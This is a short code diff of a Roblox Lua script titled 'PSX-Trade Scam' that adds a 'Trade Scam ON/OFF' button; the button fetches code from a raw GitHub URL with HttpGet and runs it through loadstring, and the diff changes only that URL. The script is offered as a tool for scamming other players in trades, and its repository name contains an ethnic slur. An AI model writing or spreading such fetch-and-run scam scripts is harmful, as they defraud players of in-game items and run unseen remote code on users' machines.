@@ -11,6 +11,6 @@ local Window = Library.CreateLib("PSX-Trade Scam", "Midnight")
 
 
     MainSection:NewButton("Trade Scam ON/OFF", "THIS BUTTON TURNS OFF AND ON THE SCRIPT", function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/bltryrt/chingchong/main/12'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/bltryrt/chingchong/main/123'))()
         print("Activated")
     end)
